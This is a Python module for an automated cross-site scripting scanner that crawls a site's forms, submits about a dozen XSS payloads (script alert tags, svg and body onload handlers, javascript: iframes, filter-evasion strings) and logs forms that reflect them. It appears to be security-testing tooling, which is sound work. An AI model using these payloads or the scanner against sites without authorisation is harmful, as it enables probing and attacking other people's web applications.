import os
import sys
import requests
import argparse
from urllib.parse import urljoin
from random import randint,choice
from bs4 import BeautifulSoup as bs
from string import ascii_uppercase, ascii_lowercase

sys.path.append(os.getcwd() + '/..')
from Utils.helpers import *

# Local Consts
DEFAULT_HEADERS = {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
RESULTS_DIR_PATH  = os.path.dirname(os.path.dirname(os.path.dirname((os.path.abspath(__file__))))) + r"/Results"
XSS_RESULTS_PATH = RESULTS_DIR_PATH + r"/XssScan"

class XssScanner(object):
    def __init__(self, url, uid):
        """
        Class variables initialize.
        Creating directories for the results.
        """
        self.user_id = uid
        self.url = url
        self.results = []
        make_results_dir(RESULTS_DIR_PATH)
        make_results_dir(XSS_RESULTS_PATH)

    def _xss_payloads(self):
        """ Cross-Site Scripting"""
        payload =  [r"<script>alert('"+self._generate_random_string(5)+"')</script>"]
        payload += [r"<script>alert('"+self._generate_random_string(5)+r"');</script>"]
        payload += [r"\'\';!--\"<"+self._generate_random_string(5)+r">=&{()}"]
        payload += [r"<script>a=/"+self._generate_random_string(5)+r"/"]
        payload += [r"<body onload=alert('"+self._generate_random_string(5)+r"')>"]
        payload += [r"<iframe src=javascript:alert('"+self._generate_random_string(5)+r"')>"]
        payload += [r"<x onxxx=alert('"+self._generate_random_string(5)+r"') 1='"]
        payload += [r"</script><svg onload=alert("+self._generate_random_string(5)+r")>"]
        payload += [r"<svg onload=alert('"+self._generate_random_string(5)+r"')>"]
        payload += [r"alert\`"+self._generate_random_string(5)+r"\`"]
        payload += [r"><script>"+self._generate_random_string(5)+""]
        payload += [r"\"><script>alert('"+self._generate_random_string(5)+"');</script>"]
        payload += [r"<  script > "+self._generate_random_string(5)+" < / script>"]
        return payload

    def _generate_random_string(self, n):
        return "".join([choice(ascii_uppercase + ascii_lowercase) for _ in range(0,int(n))])

    def get_all_forms(self, url):
        forms_found = []
        soup = bs(requests.get(url, headers=DEFAULT_HEADERS).content, "html.parser")
        
        for form in soup.find_all("form"):
            if form.has_attr('action') and form.has_attr('method'):
                forms_found.append(form)

        return forms_found

    def get_form_details(self, form):
        details = {}
        inputs = []
        
        action = form.attrs.get("action").lower()
        method = form.attrs.get("method", "get").lower()
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        
        return details

    def submit_form(self, form_details, url, value):
        target_url = urljoin(url, form_details["action"])
        
        inputs = form_details["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value
            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value

        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, headers=DEFAULT_HEADERS, params=data)

    def scan(self):
        """
        Given a `url`, it prints all XSS vulnerable forms and 
        returns True if any is vulnerable, False otherwise
        """
        
        try:
            forms = self.get_all_forms(self.url)

            for form in forms:
                form_details = self.get_form_details(form)
                for payload in self._xss_payloads():
                    content = self.submit_form(form_details, self.url, payload).content.decode()
                    if payload in content:
                        self.results.append(form_details)
                        
        except Exception as e:
            self.results = {"Error while tring to attack target": str(e)}
            
        save_results_to_json(XSS_RESULTS_PATH, self.results, self.user_id)
        

def get_args():
    """
    Get arguments for the XSS Scanner Module.
    """
    parser = argparse.ArgumentParser(description="XSS Scan Module",
                                     usage="xss.py -s <SITE> -u <USER_ID>")

    parser.add_argument('-s','--site', help='The site to scan', required=True)
    parser.add_argument('-u','--uid', help='User ID', required=True)

    return vars(parser.parse_args())

def main():
    """
    Main function.
    """
    args = get_args()
    scanner = XssScanner(args['site'], args['uid'])
    scanner.scan()
    send_to_api(args['uid'])
    
if __name__ == '__main__':
    main()
